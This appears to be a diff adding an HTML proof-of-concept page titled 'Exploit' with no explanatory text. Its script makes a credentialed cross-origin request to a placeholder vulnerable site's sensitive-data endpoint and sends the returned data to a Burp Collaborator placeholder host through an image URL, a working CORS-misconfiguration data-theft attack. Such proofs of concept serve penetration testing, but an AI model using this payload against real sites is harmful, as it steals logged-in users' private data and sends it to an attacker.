@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit</title>
+</head>
+<body>
+    <script type="text/javascript">
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'http://target-vulnerable-site.com/sensitive-data', true);
+        xhr.withCredentials = true;
+        xhr.setRequestHeader('Origin', 'http://<your-collaborator-subdomain>.burpcollaborator.net');
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4 && xhr.status == 200) {
+                var data = xhr.responseText;
+                var img = new Image();
+                img.src = 'http://<your-collaborator-subdomain>.burpcollaborator.net/log?data=' + encodeURIComponent(data);
+            }
+        };
+        xhr.send();
+    </script>
+</body>
+</html>
